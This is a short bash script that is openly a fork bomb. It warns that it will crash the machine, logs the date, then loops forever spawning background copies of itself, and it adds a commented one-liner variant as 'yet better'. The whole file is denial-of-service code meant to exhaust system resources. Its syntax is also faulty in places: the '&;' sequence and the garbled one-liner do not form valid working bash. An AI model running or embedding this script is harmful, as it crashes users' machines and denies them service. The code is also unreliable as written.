#!/usr/bin/bash

# WARNING:   THIS WILL CRASH YOUR MACHINE

# log the execution time and date
echo `date` >> log
# launch another instance of this script in the background
while true; do bash $0 &; done

# yet better
# ;(:|;&);:
